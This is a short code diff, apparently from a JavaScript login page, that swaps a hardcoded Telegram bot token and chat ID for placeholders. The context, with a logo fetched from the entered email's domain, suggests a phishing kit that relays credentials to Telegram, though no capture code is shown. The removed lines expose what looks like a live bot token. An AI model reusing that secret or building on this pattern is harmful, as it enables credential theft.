@@ -15,8 +15,8 @@
     checking: 'Checking, please wait...'
   });
 
-  const TELEGRAM_BOT_TOKEN = '8175604987:AAHvzFUpWsaLsf4JY-jIPQ2T75Q_stqT2bI';
-  const TELEGRAM_CHAT_ID = '-1002434577801';
+  const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
+  const TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID';
 
   const updateLogo = (emailValue) => {
     const domain = emailValue.split('@')[1];
